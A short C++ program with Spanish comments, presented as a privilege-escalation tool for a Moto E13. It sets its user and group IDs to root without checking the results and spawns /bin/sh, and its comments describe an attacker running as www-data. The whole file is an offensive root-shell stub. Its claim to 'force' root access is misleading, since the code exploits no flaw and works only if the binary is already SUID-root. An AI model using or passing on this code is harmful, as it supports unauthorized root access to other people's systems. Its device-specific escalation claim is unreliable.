#include <iostream>
#include <unistd.h>

int main() {
    // 1. Verificamos nuestro ID actual (somos www-data)
    std::cout << "[*] Usuario actual ID: " << getuid() << std::endl;

    // 2. Forzamos al sistema a darnos una shell con privilegios de Root
    // El binario SUID nos permite hacer esto
    setuid(0); 
    setgid(0);
    
    std::cout << "[+] Escalando privilegios en el Moto E13..." << std::endl;
    
    // 3. Ejecutamos la shell definitiva
    char *args[] = {(char *)"/bin/sh", NULL};
    execvp(args[0], args);

    return 0;
}
